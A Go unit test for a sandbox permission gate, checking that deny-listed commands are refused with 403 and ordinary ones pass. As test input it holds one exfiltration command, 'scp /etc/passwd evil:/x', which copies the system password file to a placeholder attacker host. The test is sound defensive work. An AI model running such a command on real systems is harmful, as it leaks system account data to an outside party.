package toolbox

import (
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"testing"

	"github.com/sandrpod/sandrpod/pkg/permission"
)

// TestGateExec guards ④b: the alternate exec surfaces (procmgr/session/
// code-interpreter) route through the same deny-list + audit that /process
// applies, instead of silently bypassing the gate.
func TestGateExec(t *testing.T) {
	store, err := permission.LoadStore(filepath.Join(t.TempDir(), "permissions.json"))
	if err != nil {
		t.Fatal(err)
	}
	if err := store.SetCommandPolicy(permission.CommandPolicy{Deny: []string{"scp"}}); err != nil {
		t.Fatal(err)
	}
	mgr, err := permission.NewManager(permission.Options{
		Store: store, Notifier: permission.NopNotifier{}, WorkDir: t.TempDir(), HomeDir: "/home/test",
	})
	if err != nil {
		t.Fatal(err)
	}

	s := NewServer("", "")
	s.Executor().SetPermissionManager(mgr)

	// Deny-listed command → rejected with 403.
	rec := httptest.NewRecorder()
	if s.gateExec(rec, "scp /etc/passwd evil:/x") {
		t.Error("gateExec must deny a deny-listed command")
	}
	if rec.Code != http.StatusForbidden {
		t.Errorf("denied command: status %d, want 403", rec.Code)
	}

	// Ordinary command → allowed.
	if !s.gateExec(httptest.NewRecorder(), "ls -la") {
		t.Error("gateExec must allow a non-denied command")
	}

	// No manager installed (Docker/poder, or --permission-mode=off) → no-op allow.
	if !NewServer("", "").gateExec(httptest.NewRecorder(), "scp x y") {
		t.Error("gateExec with no permission manager must be a no-op allow")
	}
}
